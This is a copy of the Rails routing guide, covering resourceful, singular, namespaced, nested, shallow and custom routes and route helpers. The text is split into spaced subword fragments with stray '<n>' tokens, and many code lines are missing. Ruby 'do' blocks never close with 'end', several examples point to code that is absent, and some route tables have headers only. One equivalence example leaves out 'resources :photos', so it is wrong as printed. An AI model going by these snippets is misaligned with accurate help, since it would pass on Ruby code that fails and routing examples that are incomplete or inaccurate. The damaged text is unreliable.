▁This ▁guide ▁cover s ▁the ▁user - f ac ing ▁features ▁of ▁Rails ▁routing .
▁* ▁How ▁to ▁interpret ▁the ▁code ▁in ▁` routes . rb `.
▁* ▁How ▁to ▁construct ▁your ▁own ▁routes , ▁using ▁either ▁the ▁preferred ▁resource ful ▁style ▁or ▁the ▁` match ` ▁method .
▁* ▁What ▁parameters ▁to ▁expect ▁an ▁action ▁to ▁receive .
▁* ▁How ▁to ▁automatically ▁create ▁paths ▁and ▁URLs ▁using ▁route ▁helpers .
▁* ▁A d v ance d ▁technique s ▁such ▁as ▁constraints ▁and ▁Rack ▁end point s .
▁The ▁P urpose ▁of ▁the ▁Rails ▁Route r
▁--------------- ----------------
▁The ▁Rails ▁route r ▁recognize s ▁URLs ▁and ▁ dispatch es ▁them ▁to ▁a ▁controller ' s ▁action .
▁It ▁can ▁also ▁generate ▁paths ▁and ▁URLs , ▁avoid ing ▁the ▁need ▁to ▁hard code ▁strings ▁in ▁your ▁views .
▁### ▁Co n n ec ting ▁URLs ▁to ▁Code
▁When ▁your ▁Rails ▁application ▁receive s ▁an ▁in com ing ▁request ▁for :
▁GET ▁/ patient s / 17
▁it ▁as k s ▁the ▁route r ▁to ▁match ▁it ▁to ▁a ▁controller ▁action .
▁If ▁the ▁first ▁matching ▁route ▁is :
▁get ▁' / patient s / : id ' , ▁to : ▁' patient s # show '
▁the ▁request ▁is ▁ dispatch ed ▁to ▁the ▁` patient s ` ▁controller ' s ▁` show ` ▁action ▁with ▁` { ▁id : ▁' 17 ' ▁}` ▁in ▁` params `.
▁### ▁Generat ing ▁Path s ▁and ▁URLs ▁from ▁Code
▁You ▁can ▁also ▁generate ▁paths ▁and ▁URLs .
▁If ▁the ▁route ▁above ▁is ▁modified ▁to ▁be :
▁get ▁' / patient s / : id ' , ▁to : ▁' patient s # show ' , ▁as : ▁' patient '
▁and ▁your ▁application ▁contains ▁this ▁code ▁in ▁the ▁controller :
▁@ patient ▁= ▁P at i ent . find ( 17 )
▁and ▁this ▁in ▁the ▁corresponding ▁view :
▁<%= ▁link _ to ▁' P at i ent ▁Record ' , ▁ patient _ path (@ patient ) ▁%>
▁the n ▁the ▁route r ▁will ▁generate ▁the ▁path ▁` / patient s / 17 `.
▁This ▁reduce s ▁the ▁brittle n es s ▁of ▁your ▁view ▁and ▁make s ▁your ▁code ▁easier ▁to ▁understand .
▁Note ▁that ▁the ▁id ▁does ▁not ▁need ▁to ▁be ▁specified ▁in ▁the ▁route ▁helper .
▁Resource ▁ Routing : ▁the ▁Rails ▁Default
▁ --- ---------------- ----------------
▁Resource ▁routing ▁allows ▁you ▁to ▁quickly ▁declare ▁all ▁of ▁the ▁common ▁routes ▁for ▁a ▁given ▁resource ful ▁controller .
▁Instead ▁of ▁declar ing ▁separate ▁routes ▁for ▁your ▁` index `, ▁` show `, ▁` new `, ▁` edit `, ▁` create `, ▁` update ` ▁and ▁` destroy ` ▁actions , ▁a ▁resource ful ▁route ▁declare s ▁them ▁in ▁a ▁single ▁line ▁of ▁code .
▁### ▁Resource s ▁on ▁the ▁Web
▁B row s ers ▁request ▁pages ▁from ▁Rails ▁by ▁making ▁a ▁request ▁for ▁a ▁URL ▁using ▁a ▁specific ▁HTTP ▁method , ▁such ▁as ▁` GET `, ▁` POST `, ▁` PATCH `, ▁` PUT ` ▁and ▁` DELETE `.
▁ Each ▁method ▁is ▁a ▁request ▁to ▁perform ▁an ▁operation ▁on ▁the ▁resource .
▁A ▁resource ▁route ▁map s ▁a ▁number ▁of ▁related ▁requests ▁to ▁actions ▁in ▁a ▁single ▁controller .
▁DELETE ▁/ photos / 17
▁resources ▁: photos
▁Rails ▁would ▁ dispatch ▁that ▁request ▁to ▁the ▁` destroy ` ▁method ▁on ▁the ▁` photos ` ▁controller ▁with ▁` { ▁id : ▁' 17 ' ▁}` ▁in ▁` params `.
▁### ▁CRUD , ▁Verb s , ▁and ▁Action s
▁In ▁Rails , ▁a ▁resource ful ▁route ▁provides ▁a ▁mapping ▁between ▁HTTP ▁verb s ▁and ▁URLs ▁to ▁controller ▁actions .
▁By ▁convention , ▁each ▁action ▁also ▁map s ▁to ▁particular ▁CRUD ▁operations ▁in ▁a ▁database .
▁A ▁single ▁entry ▁in ▁the ▁routing ▁file , ▁such ▁as :
▁creates ▁ s even ▁different ▁routes ▁in ▁your ▁application , ▁all ▁mapping ▁to ▁the ▁` P h o to s ` ▁controller :
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Use d ▁for ▁|
▁| ▁ --------- ▁| ▁ ---------------- ▁| ▁- ---------------- ▁| ▁--------------- ------------- ---------------- ▁|
▁| ▁GET ▁| ▁/ photos ▁| ▁ photos # index ▁| ▁display ▁a ▁list ▁of ▁all ▁ photos ▁|
▁| ▁GET ▁| ▁/ photos / new ▁| ▁ photos # new ▁| ▁return ▁an ▁HTML ▁form ▁for ▁creating ▁a ▁new ▁ photo ▁|
▁| ▁POST ▁| ▁/ photos ▁| ▁ photos # create ▁| ▁create ▁a ▁new ▁ photo ▁|
▁| ▁GET ▁| ▁/ photos / : id ▁| ▁ photos # show ▁| ▁display ▁a ▁specific ▁ photo ▁|
▁| ▁GET ▁| ▁/ photos / : id / edit ▁| ▁ photos # edit ▁| ▁return ▁an ▁HTML ▁form ▁for ▁editing ▁a ▁ photo ▁|
▁| ▁ PATCH / PUT ▁| ▁/ photos / : id ▁| ▁ photos # update ▁| ▁update ▁a ▁specific ▁ photo ▁|
▁| ▁DELETE ▁| ▁/ photos / : id ▁| ▁ photos # destroy ▁| ▁delete ▁a ▁specific ▁ photo ▁|
▁NOTE : ▁Because ▁the ▁route r ▁uses ▁the ▁HTTP ▁verb ▁and ▁URL ▁to ▁match ▁in b ound ▁requests , ▁four ▁URLs ▁map ▁to ▁ s even ▁different ▁actions .
▁NOTE : ▁Rails ▁routes ▁are ▁match ed ▁in ▁the ▁order ▁they ▁are ▁specified , ▁so ▁if ▁you ▁have ▁a ▁` resources ▁: photos ` ▁above ▁a ▁` get ▁' photos / p o ll ' ` ▁the ▁` show ` ▁action ' s ▁route ▁for ▁the ▁` resources ` ▁line ▁will ▁be ▁match ed ▁before ▁the ▁` get ` ▁line .
▁To ▁fix ▁this , ▁move ▁the ▁` get ` ▁line ▁** a b o ve ** ▁the ▁` resources ` ▁line ▁so ▁that ▁it ▁is ▁match ed ▁first .
▁### ▁Path ▁and ▁URL ▁ Helpers
▁Creat ing ▁a ▁resource ful ▁route ▁will ▁also ▁expose ▁a ▁number ▁of ▁helpers ▁to ▁the ▁controllers ▁in ▁your ▁application .
▁In ▁the ▁case ▁of ▁` resources ▁: photos ` :
▁* ▁` photos _ path ` ▁returns ▁` / photos `
▁* ▁` new _ photo _ path ` ▁returns ▁` / photos / new `
▁* ▁` edit _ photo _ path (: id )` ▁returns ▁` / photos / : id / edit ` ▁( for ▁instance , ▁` edit _ photo _ path (10) ` ▁returns ▁` / photos / 10 / edit `)
▁* ▁` photo _ path (: id )` ▁returns ▁` / photos / : id ` ▁( for ▁instance , ▁` photo _ path (10) ` ▁returns ▁` / photos / 10 `)
▁ Each ▁of ▁these ▁helpers ▁has ▁a ▁corresponding ▁` _ url ` ▁helper ▁( such ▁as ▁` photos _ url `) ▁which ▁returns ▁the ▁same ▁path ▁prefix ed ▁with ▁the ▁current ▁host , ▁ port ▁and ▁path ▁prefix .
▁### ▁Defin ing ▁Multi p le ▁Resource s ▁at ▁the ▁S a me ▁Time
▁If ▁you ▁need ▁to ▁create ▁routes ▁for ▁more ▁than ▁one ▁resource , ▁you ▁can ▁save ▁a ▁bit ▁of ▁typing ▁by ▁defin ing ▁them ▁all ▁with ▁a ▁single ▁call ▁to ▁` resources ` :
▁resources ▁: photos , ▁: books , ▁: video s
▁This ▁works ▁exactly ▁the ▁same ▁as :
▁resources ▁: books
▁resources ▁: video s
▁### ▁S ing ul ar ▁Resource s
▁Sometimes , ▁you ▁have ▁a ▁resource ▁that ▁clients ▁always ▁look ▁up ▁without ▁refer en c ing ▁an ▁ ID .
▁For ▁example , ▁you ▁would ▁like ▁` / profile ` ▁to ▁always ▁show ▁the ▁profile ▁of ▁the ▁current ly ▁logged ▁in ▁user .
▁In ▁this ▁case , ▁you ▁can ▁use ▁a ▁singular ▁resource ▁to ▁map ▁` / profile ` ▁( rather ▁than ▁` / profile / : id `) ▁to ▁the ▁` show ` ▁action :
▁get ▁' profile ' , ▁to : ▁' users # show '
▁Pass ing ▁a ▁` String ` ▁to ▁` get ` ▁will ▁expect ▁a ▁` controller # action ` ▁format , ▁while ▁passing ▁a ▁` Symbol ` ▁will ▁map ▁directly ▁to ▁an ▁action :
▁get ▁' profile ' , ▁to : ▁: show
▁This ▁resource ful ▁route :
▁resource ▁: geocoder
▁creates ▁ s i x ▁different ▁routes ▁in ▁your ▁application , ▁all ▁mapping ▁to ▁the ▁` G e o code r s ` ▁controller :
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Use d ▁for ▁|
▁| ▁ --------- ▁| ▁-------------- ▁| ▁- ---------------- ▁| ▁-------------- --------------- ---------------- ▁|
▁| ▁GET ▁| ▁/ geocoder / new ▁| ▁ geocoder s # new ▁| ▁return ▁an ▁HTML ▁form ▁for ▁creating ▁the ▁ geocoder ▁|
▁| ▁POST ▁| ▁/ geocoder ▁| ▁ geocoder s # create ▁| ▁create ▁the ▁new ▁ geocoder ▁|
▁| ▁GET ▁| ▁/ geocoder ▁| ▁ geocoder s # show ▁| ▁display ▁the ▁one ▁and ▁only ▁ geocoder ▁resource ▁|
▁| ▁GET ▁| ▁/ geocoder / edit ▁| ▁ geocoder s # edit ▁| ▁return ▁an ▁HTML ▁form ▁for ▁editing ▁the ▁ geocoder ▁|
▁| ▁ PATCH / PUT ▁| ▁/ geocoder ▁| ▁ geocoder s # update ▁| ▁update ▁the ▁one ▁and ▁only ▁ geocoder ▁resource ▁|
▁| ▁DELETE ▁| ▁/ geocoder ▁| ▁ geocoder s # destroy ▁| ▁delete ▁the ▁ geocoder ▁resource ▁|
▁NOTE : ▁Because ▁you ▁m ight ▁want ▁to ▁use ▁the ▁same ▁controller ▁for ▁a ▁singular ▁route ▁( ` / account `) ▁and ▁a ▁plural ▁route ▁( ` / account s / 4 5 ` ), ▁singular ▁resources ▁map ▁to ▁plural ▁controllers .
▁So ▁that , ▁for ▁example , ▁` resource ▁: photo ` ▁and ▁` resources ▁: photos ` ▁creates ▁both ▁singular ▁and ▁plural ▁routes ▁that ▁map ▁to ▁the ▁same ▁controller ▁( ` PhotosController ` ).
▁A ▁singular ▁resource ful ▁route ▁generates ▁these ▁helpers :
▁* ▁` new _ geocoder _ path ` ▁returns ▁` / geocoder / new `
▁* ▁` edit _ geocoder _ path ` ▁returns ▁` / geocoder / edit `
▁* ▁` geocoder _ path ` ▁returns ▁` / geocoder `
▁As ▁with ▁plural ▁resources , ▁the ▁same ▁helpers ▁end ing ▁in ▁` _ url ` ▁will ▁also ▁include ▁the ▁host , ▁ port ▁and ▁path ▁prefix .
▁WARNING : ▁A ▁[ long - st and ing ▁bug ]( https :// github . com / rails / rails / issue s /1 76 9 ) ▁prevent s ▁` form _ for ` ▁from ▁working ▁automatically ▁with ▁singular ▁resources .
▁As ▁a ▁work ar ound , ▁specify ▁the ▁URL ▁for ▁the ▁form ▁directly , ▁like ▁so :
▁form _ for ▁@ geocoder , ▁url : ▁ geocoder _ path ▁do ▁| f |
▁### ▁Controller ▁Name space s ▁and ▁ Routing
▁You ▁may ▁wish ▁to ▁ org an ize ▁group s ▁of ▁controllers ▁under ▁a ▁ namespace .
▁ Most ▁commonly , ▁you ▁m ight ▁group ▁a ▁number ▁of ▁ administrative ▁controllers ▁under ▁an ▁` Admin :: ` ▁ namespace .
▁You ▁would ▁place ▁these ▁controllers ▁under ▁the ▁` app / controllers / admin ` ▁directory , ▁and ▁you ▁can ▁group ▁them ▁together ▁in ▁your ▁route r :
▁ namespace ▁: admin ▁do
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁scope ▁module : ▁' admin ' ▁do
▁or , ▁for ▁a ▁single ▁case :
▁scope ▁' / admin ' ▁do
▁In ▁each ▁of ▁these ▁cases , ▁the ▁named ▁routes ▁remain ▁the ▁same ▁as ▁if ▁you ▁did ▁not ▁use ▁` scope `.
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁TIP : ▁ _ If ▁you ▁need ▁to ▁use ▁a ▁different ▁controller ▁ namespace ▁inside ▁a ▁` namespace ` ▁block ▁you ▁can ▁specify ▁an ▁ abs ol ute ▁controller ▁path , ▁e . g : ▁` get ▁' / foo ' ▁=> ▁' / foo # index ' `. _
▁### ▁Nest ed ▁Resource s
▁It ' s ▁common ▁to ▁have ▁resources ▁that ▁are ▁logic ally ▁ child re n ▁of ▁other ▁resources .
▁For ▁example , ▁suppose ▁your ▁application ▁includes ▁these ▁models :
▁class ▁ Magazine ▁< ▁ActiveRecord :: Base
▁has _ many ▁: ads
▁class ▁A d ▁< ▁ActiveRecord :: Base
▁belongs _ to ▁: magazine
▁Nest ed ▁routes ▁allow ▁you ▁to ▁capture ▁this ▁relationship ▁in ▁your ▁routing .
▁In ▁this ▁case , ▁you ▁could ▁include ▁this ▁route ▁declaration :
▁resources ▁: magazine s ▁do
▁resources ▁: ads
▁In ▁addition ▁to ▁the ▁routes ▁for ▁ magazine s , ▁this ▁declaration ▁will ▁also ▁route ▁ ads ▁to ▁an ▁` A d sController `.
▁The ▁a d ▁URLs ▁require ▁a ▁ magazine :
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Use d ▁for ▁|
▁| ▁ --------- ▁| ▁-------------- ------ ---------------- ▁| ▁- ---------------- ▁| ▁-------------- ------------- --------------- ---------------- ---------------- ▁|
▁| ▁GET ▁| ▁/ magazine s / : magazine _ id / ads ▁| ▁ ads # index ▁| ▁display ▁a ▁list ▁of ▁all ▁ ads ▁for ▁a ▁specific ▁ magazine ▁|
▁| ▁GET ▁| ▁/ magazine s / : magazine _ id / ads / new ▁| ▁ ads # new ▁| ▁return ▁an ▁HTML ▁form ▁for ▁creating ▁a ▁new ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁| ▁POST ▁| ▁/ magazine s / : magazine _ id / ads ▁| ▁ ads # create ▁| ▁create ▁a ▁new ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁| ▁GET ▁| ▁/ magazine s / : magazine _ id / ads / : id ▁| ▁ ads # show ▁| ▁display ▁a ▁specific ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁| ▁GET ▁| ▁/ magazine s / : magazine _ id / ads / : id / edit ▁| ▁ ads # edit ▁| ▁return ▁an ▁HTML ▁form ▁for ▁editing ▁an ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁| ▁ PATCH / PUT ▁| ▁/ magazine s / : magazine _ id / ads / : id ▁| ▁ ads # update ▁| ▁update ▁a ▁specific ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁| ▁DELETE ▁| ▁/ magazine s / : magazine _ id / ads / : id ▁| ▁ ads # destroy ▁| ▁delete ▁a ▁specific ▁a d ▁ belonging ▁to ▁a ▁specific ▁ magazine ▁|
▁This ▁will ▁also ▁create ▁routing ▁helpers ▁such ▁as ▁` magazine _ ads _ url ` ▁and ▁` edit _ magazine _ ad _ path `.
▁These ▁helpers ▁take ▁an ▁instance ▁of ▁ Magazine ▁as ▁the ▁first ▁parameter ▁( ` magazine _ ads _ url (@ magazine )` ).
▁#### ▁L i m it s ▁to ▁Nest ing
▁You ▁can ▁ n est ▁resources ▁within ▁other ▁nested ▁resources ▁if ▁you ▁like .
▁For ▁example :
▁resources ▁: p u b li s h ers ▁do
▁resources ▁: magazine s ▁do
▁resources ▁: photos
▁D eep ly - nested ▁resources ▁quickly ▁become ▁cumbersome .
▁In ▁this ▁case , ▁for ▁example , ▁the ▁application ▁would ▁recognize ▁paths ▁such ▁as :
▁/ p u b li s h ers /1/ magazine s / 2 / photos / 3
▁The ▁corresponding ▁route ▁helper ▁would ▁be ▁` p u b li s h er _ magazine _ photo _ url `, ▁requiring ▁you ▁to ▁specify ▁objects ▁at ▁all ▁three ▁level s .
▁Inde ed , ▁this ▁situation ▁is ▁confusing ▁enough ▁that ▁a ▁popular ▁[ article ]( http :// web log . j am is b uck . org / 200 7 / 2 / 5 / n est ing - resources ) ▁by ▁ J am is ▁B uck ▁pro p o s es ▁a ▁rule ▁of ▁thumb ▁for ▁good ▁Rails ▁design :
▁TIP : ▁ _ Re source s ▁should ▁ never ▁be ▁nested ▁more ▁than ▁1 ▁level ▁ deep . _
▁#### ▁S h allow ▁Nest ing
▁One ▁way ▁to ▁avoid ▁ deep ▁nesting ▁( as ▁recommended ▁above ) ▁is ▁to ▁generate ▁the ▁collection ▁actions ▁scope d ▁under ▁the ▁ parent , ▁so ▁as ▁to ▁get ▁a ▁sense ▁of ▁the ▁hierarchy , ▁but ▁to ▁not ▁ n est ▁the ▁member ▁actions .
▁In ▁other ▁words , ▁to ▁only ▁build ▁routes ▁with ▁the ▁minimal ▁amount ▁of ▁information ▁to ▁unique ly ▁identify ▁the ▁resource , ▁like ▁this :
▁resources ▁: comments , ▁only : ▁[ : index , ▁: new , ▁: create ]
▁resources ▁: comments , ▁only : ▁[ : show , ▁: edit , ▁: update , ▁: destroy ]
▁This ▁idea ▁ str ike s ▁a ▁b al ance ▁between ▁ de script ive ▁routes ▁and ▁ deep ▁nesting .
▁There ▁exists ▁shorthand ▁syntax ▁to ▁achieve ▁just ▁that , ▁via ▁the ▁`: shallow ` ▁option :
▁resources ▁: comments , ▁ shallow : ▁true
▁This ▁will ▁generate ▁the ▁exact ▁same ▁routes ▁as ▁the ▁first ▁example .
▁You ▁can ▁also ▁specify ▁the ▁`: shallow ` ▁option ▁in ▁the ▁ parent ▁resource , ▁in ▁which ▁case ▁all ▁of ▁the ▁nested ▁resources ▁will ▁be ▁ shallow :
▁resources ▁: comments
▁resources ▁: quot es
▁resources ▁: d ra f t s
▁The ▁` shallow ` ▁method ▁of ▁the ▁D S L ▁creates ▁a ▁scope ▁inside ▁of ▁which ▁every ▁nesting ▁is ▁ shallow .
▁This ▁generates ▁the ▁same ▁routes ▁as ▁the ▁previous ▁example :
▁ shallow ▁do
▁resources ▁: comments
▁resources ▁: quot es
▁resources ▁: d ra f t s
▁There ▁exist ▁two ▁options ▁for ▁` scope ` ▁to ▁customize ▁ shallow ▁routes .
▁`: shallow _ path ` ▁prefix es ▁member ▁paths ▁with ▁the ▁specified ▁parameter :
▁scope ▁ shallow _ path : ▁" sekret " ▁do
▁resources ▁: comments , ▁ shallow : ▁true
▁The ▁comments ▁resource ▁here ▁will ▁have ▁the ▁following ▁routes ▁generated ▁for ▁it :
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁--------------- ------------- ----------------
▁- ----------------
▁| ▁GET ▁| ▁/ sekret / comments / : id / edit ( . : format ) ▁| ▁comments # edit ▁| ▁edit _ comment _ path ▁|
▁| ▁GET ▁| ▁/ sekret / comments / : id ( . : format ) ▁| ▁comments # show ▁| ▁comment _ path ▁|
▁| ▁ PATCH / PUT ▁| ▁/ sekret / comments / : id ( . : format ) ▁| ▁comments # update ▁| ▁comment _ path ▁|
▁| ▁DELETE ▁| ▁/ sekret / comments / : id ( . : format ) ▁| ▁comments # destroy ▁| ▁comment _ path ▁|
▁The ▁`: shallow _ prefix ` ▁option ▁add s ▁the ▁specified ▁parameter ▁to ▁the ▁named ▁helpers :
▁scope ▁ shallow _ prefix : ▁" sekret " ▁do
▁| ▁HTTP ▁Verb ▁| ▁Path ▁| ▁Controller # Action ▁| ▁Name d ▁ Helper ▁|
▁| ▁GET ▁| ▁/ comments / : id / edit ( . : format ) ▁| ▁comments # edit ▁| ▁edit _ sekret _ comment _ path ▁|
▁| ▁GET ▁| ▁/ comments / : id ( . : format ) ▁| ▁comments # show ▁| ▁ sekret _ comment _ path ▁|
▁| ▁ PATCH / PUT ▁| ▁/ comments / : id ( . : format ) ▁| ▁comments # update ▁| ▁ sekret _ comment _ path ▁|
▁| ▁DELETE ▁| ▁/ comments / : id ( . : format ) ▁| ▁comments # destroy ▁| ▁ sekret _ comment _ path ▁|
▁### ▁ Routing ▁concern s
▁ Routing ▁ Concern s ▁allows ▁you ▁to ▁declare ▁common ▁routes ▁that ▁can ▁be ▁reuse d ▁inside ▁other ▁resources ▁and ▁routes .
▁To ▁define ▁a ▁concern :
▁concern ▁: comment able ▁do
▁concern ▁: image _ at t a ch able ▁do
▁resources ▁: images , ▁only : ▁: index
▁These ▁concern s ▁can ▁be ▁used ▁in ▁resources ▁to ▁avoid ▁code ▁duplication ▁and ▁share ▁behavior ▁across ▁routes :
▁resources ▁: messages , ▁concern s : ▁: comment able
▁The ▁above ▁is ▁equivalent ▁to :
▁resources ▁: messages ▁do
▁Also ▁you ▁can ▁use ▁them ▁in ▁any ▁place ▁that ▁you ▁want ▁inside ▁the ▁routes , ▁for ▁example ▁in ▁a ▁scope ▁or ▁ namespace ▁call :
▁concern s ▁: comment able
▁### ▁Creat ing ▁Path s ▁and ▁URLs ▁ From ▁Object s
▁In ▁addition ▁to ▁using ▁the ▁routing ▁helpers , ▁Rails ▁can ▁also ▁create ▁paths ▁and ▁URLs ▁from ▁an ▁array ▁of ▁parameters .
▁For ▁example , ▁suppose ▁you ▁have ▁this ▁set ▁of ▁routes :
▁When ▁using ▁` magazine _ ad _ path `, ▁you ▁can ▁pass ▁in ▁instance s ▁of ▁` Magazine ` ▁and ▁` A d ` ▁instead ▁of ▁the ▁ n umeric ▁ ID s :
▁<%= ▁link _ to ▁' A d ▁details ' , ▁ magazine _ ad _ path (@ magazine , ▁@ ad ) ▁%>
▁You ▁can ▁also ▁use ▁` url _ for ` ▁with ▁a ▁set ▁of ▁objects , ▁and ▁Rails ▁will ▁automatically ▁determine ▁which ▁route ▁you ▁want :
▁<%= ▁link _ to ▁' A d ▁details ' , ▁url _ for ( [ @ magazine , ▁@ ad ]) ▁%>
▁In ▁this ▁case , ▁Rails ▁will ▁see ▁that ▁`@ magazine ` ▁is ▁a ▁` Magazine ` ▁and ▁`@ ad ` ▁is ▁an ▁` A d ` ▁and ▁will ▁therefore ▁use ▁the ▁` magazine _ ad _ path ` ▁helper .
▁In ▁helpers ▁like ▁` link _ to `, ▁you ▁can ▁specify ▁just ▁the ▁object ▁in ▁place ▁of ▁the ▁full ▁` url _ for ` ▁call :
▁<%= ▁link _ to ▁' A d ▁details ' , ▁[ @ magazine , ▁@ ad ] ▁%>
▁If ▁you ▁want ed ▁to ▁link ▁to ▁just ▁a ▁ magazine :
▁<%= ▁link _ to ▁' Magazine ▁details ' , ▁@ magazine ▁%>
▁For ▁other ▁actions , ▁you ▁just ▁need ▁to ▁insert ▁the ▁action ▁name ▁as ▁the ▁first ▁element ▁of ▁the ▁array :
▁<%= ▁link _ to ▁' Edit ▁A d ' , ▁[ : edit , ▁@ magazine , ▁@ ad ] ▁%>
▁This ▁allows ▁you ▁to ▁treat ▁instance s ▁of ▁your ▁models ▁as ▁URLs , ▁and ▁is ▁a ▁key ▁advantage ▁to ▁using ▁the ▁resource ful ▁style .
▁### ▁ Adding ▁More ▁RESTful ▁Action s
▁You ▁are ▁not ▁ limited ▁to ▁the ▁ s even ▁routes ▁that ▁RESTful ▁routing ▁creates ▁by ▁default .
▁If ▁you ▁like , ▁you ▁may ▁add ▁ additional ▁routes ▁that ▁apply ▁to ▁the ▁collection ▁or ▁individual ▁member s ▁of ▁the ▁collection .
▁#### ▁ Adding ▁M em b er ▁Routes
▁To ▁add ▁a ▁member ▁route , ▁just ▁add ▁a ▁` member ` ▁block ▁into ▁the ▁resource ▁block :
▁resources ▁: photos ▁do
▁member ▁do
▁get ▁' preview '
▁This ▁will ▁recognize ▁` / photos /1/ preview ` ▁with ▁GET , ▁and ▁route ▁to ▁the ▁` preview ` ▁action ▁of ▁` PhotosController `, ▁with ▁the ▁resource ▁id ▁value ▁passed ▁in ▁` params [: id ]` .
▁It ▁will ▁also ▁create ▁the ▁` preview _ photo _ url ` ▁and ▁` preview _ photo _ path ` ▁helpers .
▁With in ▁the ▁block ▁of ▁member ▁routes , ▁each ▁route ▁name ▁specifie s ▁the ▁HTTP ▁verb < n > will ▁be ▁recognize d .
▁If ▁you ▁don ' t ▁have ▁multiple ▁` member ` ▁routes , ▁you ▁can ▁also ▁pass ▁`: on ` ▁to ▁a < n > route , ▁eliminat ing ▁the ▁block :
▁get ▁' preview ' , ▁on : ▁: member
▁You ▁can ▁leave ▁out ▁the ▁`: on ` ▁option , ▁this ▁will ▁create ▁the ▁same ▁member ▁route ▁except ▁that ▁the ▁resource ▁id ▁value ▁will ▁be ▁available ▁in ▁` params [: photo _ id ]` ▁instead ▁of ▁` params [: id ]` .
▁#### ▁ Adding ▁Co ll ection ▁Routes
▁To ▁add ▁a ▁route ▁to ▁the ▁collection :
▁collection ▁do
▁get ▁' search '
▁This ▁will ▁enable ▁Rails ▁to ▁recognize ▁paths ▁such ▁as ▁` / photos / search ` ▁with ▁GET , ▁and ▁route ▁to ▁the ▁` search ` ▁action ▁of ▁` PhotosController `.
▁It ▁will ▁also ▁create ▁the ▁` search _ photos _ url ` ▁and ▁` search _ photos _ path ` ▁route ▁helpers .
▁Ju st ▁as ▁with ▁member ▁routes , ▁you ▁can ▁pass ▁`: on ` ▁to ▁a ▁route :
▁get ▁' search ' , ▁on : ▁: collection
▁#### ▁ Adding ▁Routes ▁for ▁Add it ion al ▁ New ▁Action s
▁To ▁add ▁an ▁alternate ▁new ▁action ▁using ▁the ▁`: on ` ▁shortcut :
▁resources ▁: comments ▁do
▁get ▁' preview ' , ▁on : ▁: new
▁This ▁will ▁enable ▁Rails ▁to ▁recognize ▁paths ▁such ▁as ▁` / comments / new / preview ` ▁with ▁GET , ▁and ▁route ▁to ▁the ▁` preview ` ▁action ▁of ▁` Comments Controller `.
▁It ▁will ▁also ▁create ▁the ▁` preview _ new _ comment _ url ` ▁and ▁` preview _ new _ comment _ path ` ▁route ▁helpers .
▁TIP : ▁If ▁you ▁find ▁yourself ▁adding ▁many ▁extra ▁actions ▁to ▁a ▁resource ful ▁route , ▁it ' s ▁time ▁to ▁stop ▁and ▁as k ▁yourself ▁whether ▁you ' re ▁d is g u is ing ▁the ▁presence ▁of ▁another ▁resource .
▁No n - Re source ful ▁Routes
▁In ▁addition ▁to ▁resource ▁routing , ▁Rails ▁has ▁powerful ▁support ▁for ▁routing ▁arbitrar y ▁URLs ▁to ▁actions .
▁Here , ▁you ▁don ' t ▁get ▁group s ▁of ▁routes ▁automatically ▁generated ▁by ▁resource ful ▁routing .
▁Instead , ▁you ▁set ▁up ▁each ▁route ▁within ▁your ▁application ▁separate ly .
▁Whi le ▁you ▁should ▁usually ▁use ▁resource ful ▁routing , ▁there ▁are ▁ still ▁many ▁place s ▁where ▁the ▁simple r ▁routing ▁is ▁more ▁appropriate .
▁There ' s ▁no ▁need ▁to ▁try ▁to ▁sho e h or n ▁every ▁last ▁piece ▁of ▁your ▁application ▁into ▁a ▁resource ful ▁framework ▁if ▁that ' s ▁not ▁a ▁good ▁fit .
▁In ▁particular , ▁simple ▁routing ▁make s ▁it ▁very ▁easy ▁to ▁map ▁ le g ac y ▁URLs ▁to ▁new ▁Rails ▁actions .
▁### ▁B ound ▁P ar am et ers
▁When ▁you ▁set ▁up ▁a ▁regular ▁route , ▁you ▁supply ▁a ▁series ▁of ▁symbols ▁that ▁Rails ▁map s ▁to ▁parts ▁of ▁an ▁in com ing ▁HTTP ▁request .
▁T w o ▁of ▁these ▁symbols ▁are ▁special : ▁`: controller ` ▁map s ▁to ▁the ▁name ▁of ▁a ▁controller ▁in ▁your ▁application , ▁and ▁`: action ` ▁map s ▁to ▁the ▁name ▁of ▁an ▁action ▁within ▁that ▁controller .
▁For ▁example , ▁consider ▁this ▁route :
▁get ▁' : controller ( / : action ( / : id ) ) '
▁If ▁an ▁in com ing ▁request ▁of ▁` / photos / show /1 ` ▁is ▁processed ▁by ▁this ▁route ▁( because ▁it ▁has n ' t ▁match ed ▁any ▁previous ▁route ▁in ▁the ▁file ), ▁the n ▁the ▁result ▁will ▁be ▁to ▁invoke ▁the ▁` show ` ▁action ▁of ▁the ▁` PhotosController `, ▁and ▁to ▁make ▁the ▁final ▁parameter ▁` "1" ` ▁available ▁as ▁` params [: id ]` .
▁This ▁route ▁will ▁also ▁route ▁the ▁in com ing ▁request ▁of ▁` / photos ` ▁to ▁` PhotosController # index `, ▁since ▁`: action ` ▁and ▁`: id ` ▁are ▁optional ▁parameters , ▁ de not ed ▁by ▁parentheses .
▁### ▁D y n am ic ▁S eg ment s
▁You ▁can ▁set ▁up ▁as ▁many ▁dynamic ▁segment s ▁within ▁a ▁regular ▁route ▁as ▁you ▁like .
▁Any th ing ▁other ▁than ▁`: controller ` ▁or ▁`: action ` ▁will ▁be ▁available ▁to ▁the ▁action ▁as ▁part ▁of ▁` params `.
▁If ▁you ▁set ▁up ▁this ▁route :
▁get ▁' : controller / : action / : id / : user _ id '
▁An ▁in com ing ▁path ▁of ▁` / photos / show /1/ 2 ` ▁will ▁be ▁ dispatch ed ▁to ▁the ▁` show ` ▁action ▁of ▁the ▁` PhotosController `.
▁` params [: id ]` ▁will ▁be ▁` "1" `, ▁and ▁` params [: user _ id ]` ▁will ▁be ▁` " 2 " `.
